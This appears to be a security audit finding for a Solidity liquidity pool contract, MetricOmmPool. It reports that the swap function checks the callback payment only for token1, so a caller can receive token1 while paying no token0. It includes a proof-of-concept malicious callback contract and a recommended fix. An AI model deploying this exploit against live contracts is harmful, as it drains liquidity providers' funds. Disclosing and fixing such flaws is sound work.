### Title
Missing Token0 Callback Payment Verification in Swap Settlement — (`metric-core/contracts/MetricOmmPool.sol`)

### Summary

The `swap` function in `MetricOmmPool` uses an optimistic-transfer / callback-settlement pattern. After computing deltas and sending output tokens to the recipient, it invokes `IMetricOmmSwapCallback.metricOmmSwapCallback` and then checks that the pool received the owed input tokens. However, the post-callback balance check is **only performed for token1** (`amount1Delta > 0`). When `zeroForOne = true` the pool owes token1 to the recipient and is owed token0 from the callback, but **no corresponding balance check is performed for token0**. A malicious or buggy callback can therefore receive token1 from the pool while paying zero token0, and the transaction will succeed — emitting a `Swap` event and updating all bin state — with no revert.

---

### Finding Description

The post-callback settlement block in `MetricOmmPool.swap` reads:

```solidity
uint256 balance1Before = balance1();
IMetricOmmSwapCallback(msg.sender).metricOmmSwapCallback(amount0Delta, amount1Delta, callbackData);
// forge-lint: disable-next-line(unsafe-typecast)
if (amount1Delta > 0 && balance1Before + uint256(amount1Delta) > balance1()) {
    revert IncorrectDelta();
}
``` [1](#0-0) 

Only `balance1Before` is snapshotted; only the branch `amount1Delta > 0` is guarded. When `zeroForOne = true`:

- `amount0Delta > 0` — the pool is owed token0 from the callback.
- `amount1Delta < 0` — the pool sends token1 to the recipient.
- The guard condition `amount1Delta > 0` evaluates to **false**, so `IncorrectDelta` is **never checked**.
- No `balance0Before` snapshot exists, so there is no way to verify token0 was received.

The `Swap` event is emitted and bin balances are written regardless:

```solidity
emit Swap(
    msg.sender, recipient, amountSpecified > 0, amount0Delta, amount1Delta,
    curBinIdx, curPosInBin, protocolFeeAmount
);
return (amount0Delta.toInt128(), amount1Delta.toInt128());
``` [2](#0-1) 

This is the direct analog of the external report's pattern: state is finalized and events are emitted even when the token transfer silently fails.

---

### Impact Explanation

A caller that implements `IMetricOmmSwapCallback` can:

1. Call `pool.swap(recipient, zeroForOne=true, ...)`.
2. Receive token1 sent to `recipient` by the pool.
3. In `metricOmmSwapCallback`, pay **zero** token0 (or an amount less than `amount0Delta`).
4. The pool does not revert — it has no token0 balance check for this direction.
5. The pool's internal bin token0 balances are decremented (or token1 balances incremented) as if the swap settled correctly, creating an accounting divergence between actual ERC-20 balances and tracked bin reserves.

Repeated exploitation drains the pool's token1 reserves while the pool's internal accounting believes it holds token0 that was never delivered. LP claims become undercollateralized, leading to **pool insolvency** and **direct loss of LP principal**.

---

### Likelihood Explanation

Any address that can call `swap` (i.e., any address not blocked by `SWAP_ALLOWLIST_PROVIDER`) can deploy a malicious callback contract and exploit this in a single transaction. No privileged role, special setup, or non-standard token behavior is required. The `zeroForOne = true` direction is a normal, documented swap path.

---

### Recommendation

Mirror the token1 check with a symmetric token0 check. Before the callback, snapshot both balances; after the callback, verify whichever delta is positive:

```solidity
uint256 balance0Before = balance0();
uint256 balance1Before = balance1();

IMetricOmmSwapCallback(msg.sender).metricOmmSwapCallback(amount0Delta, amount1Delta, callbackData);

if (amount0Delta > 0 && balance0Before + uint256(amount0Delta) > balance0()) {
    revert IncorrectDelta();
}
if (amount1Delta > 0 && balance1Before + uint256(amount1Delta) > balance1()) {
    revert IncorrectDelta();
}
```

Only one of the two branches will fire per swap direction, so the gas overhead is minimal (one extra `SLOAD` for the pre-snapshot and one comparison).

---

### Proof of Concept

```solidity
contract MaliciousCallback is IMetricOmmSwapCallback {
    IMetricOmmPool pool;
    address token1;

    constructor(address _pool, address _token1) {
        pool = IMetricOmmPool(_pool);
        token1 = _token1;
    }

    function exploit(uint128 amountOut) external {
        // zeroForOne=true: pool sends token1 to address(this), expects token0 back
        pool.swap(
            address(this),   // recipient of token1
            true,            // zeroForOne
            -int128(amountOut), // exact output of token1
            0,               // no price limit
            "",
            ""
        );
        // At this point address(this) holds `amountOut` of token1
        // and paid zero token0 — pool did not revert.
    }

    function metricOmmSwapCallback(
        int256 amount0Delta,
        int256 /*amount1Delta*/,
        bytes calldata
    ) external override {
        // amount0Delta > 0 means we owe token0 — we pay nothing.
        // No IncorrectDelta check fires for token0 direction.
        // Do nothing.
    }
}
```

After `exploit()` returns, the attacker holds `amountOut` of token1 for free. The pool's `Swap` event is emitted with correct-looking deltas, and bin state is updated as if token0 was received, silently corrupting LP accounting.
